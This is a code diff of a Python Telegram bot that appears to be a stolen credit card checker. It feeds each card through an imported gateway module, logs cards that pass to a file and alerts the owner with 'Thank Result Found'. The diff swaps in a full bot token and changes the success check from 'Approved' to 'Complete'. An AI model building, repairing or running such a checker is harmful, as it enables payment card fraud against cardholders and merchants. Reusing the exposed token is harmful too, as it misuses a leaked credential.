@@ -3,7 +3,7 @@ import telebot,time
 from telebot import types
 from gatet import Tele
 import os
-token = '7040296782:AAFXynxC35O099GeYNeXjUTrJsJ0a4QB_'
+token = '7040296782:AAFXynxC35O099GeYNeXjUTrJsJ0a4QB_Qs'
 bot=telebot.TeleBot(token,parse_mode="HTML")
 @bot.message_handler(commands=["start"])
 def start(message):
@@ -95,7 +95,7 @@ by ➜ @strawhatchannel96 ''', reply_markup=mes)
 				
 				card_info = f"💳 Card: {cc.strip()} \n📝 Message: Response: {last}"
 
-				if "Approved" in last:
+				if "Complete" in last:
 				    with open("thank_cards.txt", "a") as thank_file:
 				        thank_file.write(card_info + "\n")
 				    bot.send_message(owner_id, f"✅ Thank Result Found:\n💳 Card: {cc.strip()}")
@@ -111,7 +111,7 @@ by ➜ @strawhatchannel96 ''', reply_markup=mes)
 #Hit_Sender
 				
 				print(last)
-				if 'Approved' in last:
+				if 'Complete' in last:
 					ch += 1
 					bot.reply_to(message, msg)
 					
